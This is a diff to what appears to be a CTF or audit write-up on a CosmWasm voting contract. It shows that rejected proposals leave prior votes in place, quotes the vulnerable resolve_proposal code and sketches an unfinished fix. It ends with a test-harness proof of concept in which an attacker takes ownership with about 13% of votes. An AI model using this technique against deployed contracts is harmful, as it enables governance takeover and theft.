@@ -187,19 +187,73 @@ app.execute_contract(
 
 ### Description
 
-My guess is this is a time-dependent attack right after the proposal fails...
-The attacker uses existing token balance from the previous vote.
+Rejected resolution does not reset the votes for previous candidates.
+The attacker can use existing token balance from the previous vote
+to win an election with less than 1/3 votes cast for them.
+
+In `resolve_proposal`, 
+
+```rust
+if balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32)) {
+    ...
+} else {
+    // bao: This path does remove the proposal, but 
+    // does not reset the token in contract
+    PROPOSAL.remove(deps.storage);
+    response = response.add_attribute("result", "Failed");
+}
+```
 
 ### Recommendation
 
+Keep track of votes coming in for each proposal. Maintain this 
+invariant across the contract and re-imburse past voters at 
+end of election.
+
 ```rust
+// state.rs
+const VOTES_CASTED: Map<Addr, Uint128> = Map::new("votes_casted");
+const TOTAL_VOTES_CASTED: Item<Uint128> = Item::new()
+
+// contract.rs `receive_cw20` 
+
+
+// contract.rs `resolve_proposal`
 
 ```
 
+There are many non-goal-related bugs in this contract 
+I did not address, including:
+* CW20 token sending through `Transfer` bypasses time check 
+* CW20 token hook does not fail on non-`CastVote {}` messages 
+* Balance 1/3 check should round up since Uint128 divsion rounds down by default
+* Owner can tamper with elections
+
 ### Proof of concept
 
+See `exploit_rejected_resolution` in integration tests.
+
 ```rust
-// code goes here
+// Time passes and proposal is successful with only 
+// (20_000 / 150_000) ~ 13.3% of votes
+app.update_block(|block| {
+   block.time = block.time.plus_seconds(VOTING_WINDOW);
+});
+let res = app
+   .execute_contract(
+       Addr::unchecked(DICTATOR),
+       contract_addr.clone(),
+       &ExecuteMsg::ResolveProposal {},
+       &[],
+   )
+   .unwrap(); 
+assert_eq!(res.events[1].attributes[2], attr("result", "Passed"));
+// Dictator is now the owner
+let config: Config = app
+   .wrap()
+   .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+   .unwrap();
+assert_eq!(config.owner, DICTATOR.to_string());
 ```
 
 ---
